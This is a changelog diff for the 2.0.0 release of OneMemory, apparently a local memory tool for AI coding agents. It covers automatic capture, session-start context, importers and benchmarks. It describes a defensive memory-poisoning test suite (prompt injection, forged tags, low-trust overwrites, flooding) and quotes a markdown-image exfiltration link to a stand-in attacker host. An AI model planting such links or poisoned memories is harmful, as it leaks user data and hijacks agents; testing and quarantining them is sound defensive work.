@@ -4,7 +4,106 @@ All notable changes to this project are documented here. The format is based on
 [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project aims
 to follow [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
-## [Unreleased]
+## [2.0.0] - 2026-10-31
+
+OneMemory now remembers on its own: it records what your agent does, distills it into short typed notes, and brings the
+right ones back at the start of the next session — with no model call unless you turn one on, nothing leaving your
+computer, and every memory sourced, versioned and undoable. It installs into eight AI tools, imports from claude-mem,
+mem0 and basic-memory, and publishes its retrieval numbers (LongMemEval-S, LoCoMo) with the scripts to reproduce them.
+
+**Upgrading:** the database moves to schema v16 on first open (a backup is copied next to it first, as before). Older
+OneMemory versions cannot open a v16 database, so upgrade every machine that shares one. Nothing is captured until you
+run `onememory setup --capture` and say yes.
+
+### Added
+- **Automatic memory (opt-in).** `onememory setup --capture` wires Claude Code's hooks (and Codex, Gemini CLI, Muse) to
+  `onememory hook <event>`. Each tool event is redacted (`<private>…</private>` stripped, secrets masked) and kept briefly;
+  at session end it is distilled, without a model, into typed observations (files changed, commits, test runs, fail-to-pass
+  bugfixes, decisions, security notes) and one session summary. The hook never blocks your agent: it fails open and always exits 0.
+- **Session-start context.** A ranked pack of what matters for this branch, these files and your recent work, inside a
+  token budget (`ONEMEMORY_RECALL_TOKENS`, default 1500), behind an untrusted-data banner, with a savings footer.
+- **Progressive disclosure tools:** `memory_index` (one line per memory with its token cost), `memory_timeline`, `memory_get`
+  and `session_list` over MCP, and `/index`, `/timeline`, `/get`, `/sessions` over REST — look first, then fetch only what you need.
+- **File context on Read:** before your agent reads a file, it is told what memory knows about that file (advisory; it never blocks the read).
+- **Dashboard Sessions tab** with a timeline per session.
+- **Optional local summary:** `ONEMEMORY_LLM_URL` + `ONEMEMORY_LLM_MODEL` let a local model (Ollama, LM Studio) rewrite each
+  session summary in one call at session end. Off by default; loopback only unless you allow otherwise.
+- **`ONEMEMORY_EMBEDDINGS=auto`:** semantic search when the local embedding endpoint answers, silently keyword-only when not.
+- **Retrieval benchmark:** `onememory bench --longmemeval` and `--locomo` download the public datasets once and score retrieval
+  (recall@k, nDCG, MRR, latency) with no model and no judge. Results and caveats: [docs/BENCHMARK.md](./docs/BENCHMARK.md).
+- **Decay for captured rows.** Observations nobody updated or read for `ONEMEMORY_DECAY_DAYS` (30) and session summaries idle
+  `ONEMEMORY_DECAY_SUMMARY_DAYS` (180) are archived, never deleted, by the existing expiry sweep and at session end. Ordinary notes,
+  decisions and rows tagged `pinned` never decay; `0` turns it off. `onememory decay [--dry-run]` previews or runs it now; `onememory
+  restore <id>` (new, with `onememory archive <id>`) undoes it. `memory_stats` / `GET /stats` gain `decay: { candidates, archived }`.
+  A restored captured row counts as just read, so the next sweep does not take it again.
+- **Memory quality view.** `onememory quality [--json]`, `GET /quality` (admin) and a dashboard **Quality** tab list near-duplicates,
+  stale notes with a newer twin, quarantined writes, notes the linter flags and decay candidates, each with a fix through an existing
+  safe path (supersede preview + confirm with undo, consolidate dry run, archive / restore, quarantine approve / reject). New admin
+  routes `POST /quarantine/:id/approve|reject` back the dashboard buttons.
+- **Benchmark suite E, "Memory poisoning": 123 deterministic scenarios** (was 109): A 32, B 31, C 27, D 19, E 14. The new suite
+  proves injected or malicious memories do not silently reach an agent as trusted content — prompt-injection (plain, forged
+  system/tool tags, zero-width-obfuscated) is quarantined; a distrusted or low-trust writer cannot outrank or silently overwrite a
+  trusted fact; secrets are redacted on capture and blocked on write; a forged writer or namespace is stamped with the real one; an
+  unsigned import cannot pose as verified; a captured web fetch is not promoted to trusted memory; the SessionStart injection carries
+  the untrusted-data banner and leaves distrusted notes out; and mass near-duplicate flooding cannot bury the real answer. Headline
+  `poison-reach-count` must be 0. It added two bench ops (`capture`, `session_start`) to the runner. The one gap it found,
+  `GAP-POISON-MDLINK`, is fixed (see Fixed).
+
+### Changed
+- **Captured prompts and tool inputs are now encrypted at rest** when encryption is on, the same way tool outputs already were. Turning
+  encryption on or off seals or opens them too. Databases made by earlier test builds of this version get the new column when opened.
+- **Session summaries rewritten by the local model are labelled.** `memory_get` and `memory_index` mark them `model_written`, and the
+  session-start context and index lines say "(model-written)". The file, command and outcome lines under them are still the automatic ones.
+- **`onememory import --from claude-mem|mem0|basic-memory [--path p] [--dry-run] [--yes] [--namespace ns]`**: bring another memory
+  tool's notes in, with the same rules as `import --claude` (local only, dry run, secrets skipped and never shown, memory linter and
+  quarantine, re-runs add only what is new via a stable id in `source`). claude-mem's SQLite database is opened read only;
+  observations become `observation` rows with their type, files, project and original dates, and session summaries become `summary`
+  rows. mem0 reads a JSON export (categories become tags). basic-memory reads a Markdown folder, with the permalink as the id.
+  Imported rows are written by `import:<tool>` and tagged `imported:<tool>`; claude-mem's rows also carry the model-written label. How to switch over and cleanly uninstall the old tool: [docs/switching.md](./docs/switching.md).
+- **Project profile at session start:** a "What I know about this project" block at the top of the injected context: recent decisions,
+  conventions (notes tagged `convention`), the files memory mentions most (`note_files`), the last session and the open-task count. Deterministic (no
+  model), inside the recall budget, capped by `ONEMEMORY_PROFILE_TOKENS` (default 300, at most half the budget); `ONEMEMORY_PROFILE=off` turns it off.
+- **"Why was this shown?":** every injected note and index line ends with a short tag such as `{files,kw 3d}` (linked to files you changed, matches
+  your branch / changed files / recent work, among the newest, a decision; age in days), explained once by a legend line.
+- **Never show again:** a note tagged `never-show` is left out of the session-start context, the profile and the file-context hint; it stays
+  searchable. Set it with `onememory never-show <id>` (`--undo` to reverse), the dashboard's **never show** button, or a normal tag edit.
+- **Token & footprint meter:** per session and in total, the tokens injected at session start, the captured work they stood in for, and the tokens
+  the optional local summarizer used (0 when off), plus capture events and database size. Aggregate numbers only (table `meter_sessions`, created on
+  first use). Shown by `onememory doctor`, `GET /stats` / `memory_stats` (`meter`) and the dashboard's **Meter** view.
+
+- `onememory setup` now also finds and connects **Codex CLI** (`~/.codex/config.toml`: only the `[mcp_servers.onememory]`
+  table is added or removed, the rest of the file stays byte for byte), **Gemini CLI** (`~/.gemini/settings.json`),
+  **Muse** (`~/.config/muse/settings.json`, keeps or adds `"schema_version": 1`), **VS Code** (user `mcp.json`, `servers`)
+  and **Zed** (`settings.json`, `context_servers`), with the same plan, diff, backup and `--undo` as before.
+- `--hook` / `--capture` also wire the hooks of Codex (`~/.codex/hooks.json`), Gemini CLI and Muse to `onememory hook <event>`.
+- `onememory hook`: reads Gemini CLI's `prompt_response` as the stop text, and takes the session id from `MUSE_SESSION_ID`
+  or `GEMINI_SESSION_ID` when stdin has none.
+- `onememory uninstall [--dry-run] [--yes] [--purge] [--no-backup]`: replays every recorded setup in reverse (all apps,
+  MCP entries and hooks), so configs return byte for byte where nothing changed them since and files setup created are
+  deleted; entries setup did not add are listed, not touched. `--purge` then makes a final backup
+  (`~/onememory-final-backup-<time>`) and only after it worked deletes the data folder and setup's backup copies.
+- `onememory doctor` reports the data folder size (warns over 1 GB), a full capture spool, and the capture backlog
+  (events not yet distilled; warns over 10,000).
+- [docs/footprint.md](docs/footprint.md): every path OneMemory writes, when, and how to remove it.
+
+### Changed
+
+- `onememory backup` without `--out` writes to `~/onememory-backup-<time>`, not the current folder: run inside a repo,
+  the copy of your notes and key could be committed.
+
+### Fixed
+
+- Capture spool: an event that keeps failing to store is dropped after 5 drains instead of cycling forever, and a
+  `.draining` file left by a killed hook is drained later instead of staying on disk.
+- `onememory watch` stops with an error after 10 failures in a row instead of retrying every 5 s forever.
+- **`state_search` answers whole questions.** Keyword search needed every word to match, so a question such as "which
+  region do we deploy production to?" found almost nothing (LongMemEval-S recall@5 11.9%). When the all-words search
+  leaves room, it now adds notes matching some of the words, always ranked below full matches (recall@5 95%).
+- **Writes stay fast as memory grows.** Each write stored a similarity link to every close note, about 430 per captured
+  observation, so writes took ~100 ms and the database reached 111 MB at 3,000 notes. At most 32 are kept (reads use 10):
+  3.8 ms and 18 MB.
+- **Markdown image exfiltration is held** (`GAP-POISON-MDLINK`): a note with a remote markdown image carrying a query
+  string (`![x](https://attacker/p?data=...)`), which loads by itself when rendered, goes to quarantine. Badge hosts are exempt.
 
 ## [1.7.2] - 2026-10-25
 
